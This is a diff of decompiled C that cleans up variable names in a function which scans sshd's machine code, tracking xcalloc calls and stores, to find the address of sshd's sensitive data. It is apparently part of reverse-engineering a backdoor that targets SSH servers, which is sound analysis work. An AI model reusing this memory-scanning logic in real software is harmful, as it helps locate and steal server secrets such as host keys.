@@ -30,14 +30,17 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
   u8 *puVar8;
   ulong uVar9;
   byte bVar10;
-  undefined1 uVar11;
+  byte bVar11;
+  u64 store_candidates [16];
+  dasm_ctx_t store_probe_ctx;
   dasm_ctx_t insn_ctx;
   long store_hits [16];
   u8 *xcalloc_call_target;
+  u8 *store_operand_ptr;
   undefined1 local_100 [27];
   u8 hit_count;
-  undefined4 local_e4;
-  byte local_e0;
+  u32 modrm_snapshot;
+  u8 rex_rm_bits;
   u8 *local_d0;
   long local_a8 [16];
   
@@ -46,7 +49,7 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
   if (call_target == (u8 *)0x0) {
     return FALSE;
   }
-  uVar11 = 0xff;
+  bVar11 = 0xff;
   puVar8 = (u8 *)0x0;
   bVar10 = 0;
   plVar6 = local_a8;
@@ -70,23 +73,23 @@ LAB_001036eb:
   } while (BVar2 == FALSE);
   if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x1040) == 0) {
 LAB_00103788:
-    if (uVar11 != 0) {
+    if (bVar11 != 0) {
       code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
       goto LAB_001036eb;
     }
   }
   else {
     if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x40) != 0) {
-      uVar11 = *(((u8 *)&local_e4) + 2);
+      bVar11 = modrm_snapshot._2_1_;
       if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x20) != 0) {
         bVar1 = hit_count * '\x02';
 LAB_00103782:
-        uVar11 = uVar11 | bVar1 & 8;
+        bVar11 = bVar11 | bVar1 & 8;
       }
       goto LAB_00103788;
     }
     if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x1000) != 0) {
-      uVar11 = local_e0;
+      bVar11 = rex_rm_bits;
       if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x20) != 0) {
         bVar1 = hit_count << 3;
         goto LAB_00103782;
@@ -94,8 +97,8 @@ LAB_00103782:
       goto LAB_00103788;
     }
   }
-  if (((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x100) != 0) && (puVar8 = local_d0, (local_e4 & 0xff00ff00) == 0x5000000)
-     ) {
+  if (((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x100) != 0) &&
+     (puVar8 = local_d0, (modrm_snapshot & 0xff00ff00) == 0x5000000)) {
     puVar8 = local_d0 + ((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size;
   }
   if ((data_start <= puVar8) && (puVar8 < data_end)) {
@@ -126,7 +129,7 @@ LAB_00103802:
       } while( TRUE );
     }
   }
-  uVar11 = 0;
+  bVar11 = 0;
   code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
   goto LAB_001036eb;
 }
